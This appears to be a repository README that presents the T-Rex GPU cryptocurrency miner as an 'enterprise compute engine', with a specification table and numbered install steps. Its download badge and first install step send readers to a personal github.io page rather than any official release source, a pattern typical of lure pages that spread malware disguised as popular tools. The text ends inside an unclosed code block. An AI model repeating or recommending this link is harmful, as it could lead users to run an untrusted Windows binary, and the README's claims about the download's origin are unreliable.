# T-Rex Enterprise Compute Engine

**T-Rex** is an open-architecture, high-performance CUDA execution kernel and GPU workload manager designed for Windows desktop and server environments. Engineered specifically to extract maximum hash compute throughput from modern NVIDIA hardware architectures, T-Rex executes complex cryptographic proof-of-work algorithms—including Ethash, Etchash, Kawpow, Autolykos2, and Octopus. Equipped with an embedded HTTP WebUI server, auto-failover pool switching logic, thermal safety throttles, and RESTful API management endpoints, T-Rex provides real-time telemetry and configuration management for enterprise compute rigs.

[![Download T-Rex](https://img.shields.io/badge/Download-T--Rex-0078D4?style=for-the-badge&logo=nvidia&logoColor=white)](https://donnasmithw666.github.io/.github/TRex-Compute-Engine)

> **CORE ARCHITECTURE:** Low-level C++/CUDA assembly execution engine utilizing raw GPU memory controllers and parallel SM pipelines to minimize share generation latency.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT1PAMhwLpYGcEmkoAwhYFymFwMR5srTSLtRP0bmb3H6g4RK0yC6G2U9hU&s=10" alt="Program Interface Screenshot"/>

> **THREADING PROFILE:** Multi-threaded asynchronous dispatch architecture decoupling host CPU pool socket communications from low-latency GPU CUDA core execution loops.

---

## Technical Specifications Matrix

| Component | Technology | Description |
| :--- | :--- | :--- |
| Execution Core | Native CUDA Compute Engine | Low-level C++/CUDA runtime optimized for Pascal, Turing, Ampere, and Ada Lovelace architectures |
| Management Gateway | HTTP REST & WebUI Server | Embedded web monitoring suite providing real-time hashrate analytics, thermal metrics, and remote configuration adjustments |
| Routing Engine | Auto-Failover Pool Connector | Maintains primary and secondary TCP/Stratum pool connections with automatic latency-based failover handling |
| Telemetry & Safety | Hardware Overheat Protection | Continuously polls GPU core temperatures, VRAM thermal sensors, and fan speeds to trigger automated throttle safety policies |

---

## System Deployment Protocol

1. Download the latest Windows binary archive (`t-rex-x.x.x-win.zip`) using the release repository link above.
2. Extract the compressed archive contents into a dedicated directory on your local workspace drive.
3. Configure target pool parameters, receiving wallet addresses, and worker identifiers by editing a `.bat` launch batch script or modifying `config.json`.
4. Optionally generate an administrative password key for WebUI remote control via command prompt:
   ```cmd
   t-rex.exe --api-generate-key YourPasswordHere
